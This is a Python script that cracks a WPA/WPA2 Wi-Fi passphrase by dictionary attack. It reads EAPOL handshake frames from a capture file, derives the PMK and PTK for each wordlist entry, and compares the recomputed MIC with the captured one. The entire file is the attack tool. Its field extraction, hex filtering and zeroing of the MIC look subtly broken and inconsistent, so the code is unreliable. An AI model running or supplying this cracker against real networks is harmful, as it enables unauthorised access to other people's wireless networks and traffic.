import hmac
import hashlib
import binascii
from scapy.all import rdpcap, EAPOL

def customPRF512(key, A, B):
    blen = 64
    i = 0
    R = b''

    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A.encode() + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    
    return R[:blen]

# Read the pcap file
pcap = rdpcap("Shak.cap")

# EAPOL packet extraction
eapol_0 = pcap[0][EAPOL]
eapol_1 = pcap[1][EAPOL]

# Extract the necessary fields
destinationmac = eapol_0.addr2
sourcemac = eapol_0.addr1
anonce = eapol_0.key_nonce
snonce = eapol_1.key_nonce
mic = eapol_1.key_mic

variables = {
    "version_field": eapol_1.version,
    "type_field": eapol_1.type,
    "len": eapol_1.len,
    "keydes_type": eapol_1.keydes_type,
    "wlan_rsna_keydes_msgnr": eapol_1.keydes_msgnr,
    "wlan_rsna_keydes_key_info": eapol_1.keydes_key_info,
    "keydes_key_len": eapol_1.keydes_key_len,
    "keydes_replay_counter": eapol_1.keydes_replay_counter,
    "wlan_rsna_keydes_nonce": eapol_1.key_nonce,
    "keydes_key_iv": eapol_1.key_iv,
    "wlan_rsna_keydes_rsc": eapol_1.key_rsc,
    "wlan_rsna_keydes_id": eapol_1.key_id,
    "wlan_rsna_keydes_mic": eapol_1.key_mic,
    "wlan_rsna_keydes_data_len": eapol_1.key_data_len,
    "wlan_rsna_keydes_data": eapol_1.key_data
}

hex_values = [value for value in variables.values() if value is not None and all(c in '0123456789abcdefABCDEF' for c in str(value))]

# Filter out None values and non-hexadecimal values
filtered_hex_values = [value for value in hex_values if value is not None]

# Concatenate the filtered_hex_values into a single string without spaces
concatenated_values = "".join(filtered_hex_values)
eapoldata = concatenated_values[0:161] + ("00000000000000000000000000000000000") + concatenated_values[196:]

# Print the concatenated values in a single row
print(concatenated_values)

# Second EAPOL packet extraction (eapol_1 is used here)
eapol1 = {
    "version_field": eapol_0.version,
    "type_field": eapol_0.type,
    "len": eapol_0.len,
    "keydes_type": eapol_0.keydes_type,
    "wlan_rsna_keydes_msgnr": eapol_0.keydes_msgnr,
    "wlan_rsna_keydes_key_info": eapol_0.keydes_key_info,
    "keydes_key_len": eapol_0.keydes_key_len,
    "keydes_replay_counter": eapol_0.keydes_replay_counter,
    "wlan_rsna_keydes_nonce": eapol_0.key_nonce,
    "keydes_key_iv": eapol_0.key_iv,
    "wlan_rsna_keydes_rsc": eapol_0.key_rsc,
    "wlan_rsna_keydes_id": eapol_0.key_id,
    "wlan_rsna_keydes_mic": eapol_0.key_mic,
    "wlan_rsna_keydes_data_len": eapol_0.key_data_len
}

file_path = 'pwd.txt'
ssid = "PEKLO"
A = "Pairwise key expansion"
APmac = binascii.a2b_hex(sourcemac.replace(":", ""))
Clientmac = binascii.a2b_hex(destinationmac.replace(":", ""))
ANonce = binascii.a2b_hex(anonce)
SNonce = binascii.a2b_hex(snonce)
B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)
data = binascii.a2b_hex(eapoldata)
desired_mic = binascii.a2b_hex(mic.replace(":", ""))

with open(file_path, 'r') as wordlist_file:
    for line in wordlist_file:
        passPhrase = line.strip()
        pmk = hashlib.pbkdf2_hmac("sha1", passPhrase.encode("utf-8"), ssid.encode("utf-8"), 4096, 32)
        ptk = customPRF512(pmk, A, B)
        remic = hmac.new(ptk[0:16], data, hashlib.sha1).digest()

        if remic[:16] == desired_mic:
            print("Passphrase found:", passPhrase)
            break
        else:
            print("Passphrase does not match:", passPhrase)

print("End of wordlist.")
